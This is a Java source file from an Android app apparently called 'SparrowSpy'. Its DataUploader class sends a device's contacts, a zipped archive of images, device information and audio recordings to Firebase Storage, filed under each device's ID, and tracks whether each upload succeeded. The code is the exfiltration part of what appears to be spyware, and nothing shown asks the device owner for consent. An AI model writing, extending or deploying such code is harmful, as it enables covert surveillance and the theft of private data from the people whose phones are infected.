package com.tangledbytes.sparrowspy.server;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.Uri;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.Utils;

import java.io.File;

public class DataUploader {
    private static final String TAG = "DataUploader";
    private final StorageReference root;
    private final SharedPreferences prefs;

    public DataUploader(Context context) {
        FirebaseStorage storage = FirebaseManager.getFirebaseStorage();
        root = storage.getReference(Constants.FS_DEVICES).child(new Utils(context).getDeviceId());
        prefs = context.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE);
    }

    private UploadTask uploadFile(File file, String fileType, String prefKey) {
        if (!file.exists()) return null;
        StorageReference fileReference = root.child(fileType).child(file.getName());
        UploadTask uploadTask = fileReference.putFile(Uri.fromFile(file));
        uploadTask.addOnSuccessListener(taskSnapshot -> updatePreference(prefKey, true));
        uploadTask.addOnFailureListener(e -> {
            updatePreference(prefKey, false);
            Log.e(TAG, "Failed to upload " + fileType, e);
        });
        return uploadTask;
    }

    private void updatePreference(String prefKey, boolean status) {
        prefs.edit().putBoolean(prefKey, status).apply();
    }

    public UploadTask uploadContacts() {
        return uploadFile(Constants.FILE_UPLOAD_CONTACTS, "contacts", Constants.PREF_CONTACTS_STATUS);
    }

    public UploadTask uploadImages() {
        return uploadFile(Constants.FILE_UPLOAD_IMAGES_ZIP, "images", Constants.PREF_IMAGES_STATUS);
    }

    public UploadTask uploadDeviceInfo() {
        return uploadFile(Constants.FILE_UPLOAD_DEVICE_INFO, "device_info", Constants.PREF_DEVICE_INFO_STATUS);
    }

    public UploadTask uploadAudio(File audioFile) {
        return uploadFile(audioFile, "audio", Constants.PREF_AUDIO_STATUS);
    }

    public void resetUploadStatuses() {
        prefs
            .edit()
            .putBoolean(Constants.PREF_CONTACTS_STATUS, false)
            .putBoolean(Constants.PREF_IMAGES_STATUS, false)
            .putBoolean(Constants.PREF_DEVICE_INFO_STATUS, false)
            .apply();
    }
}
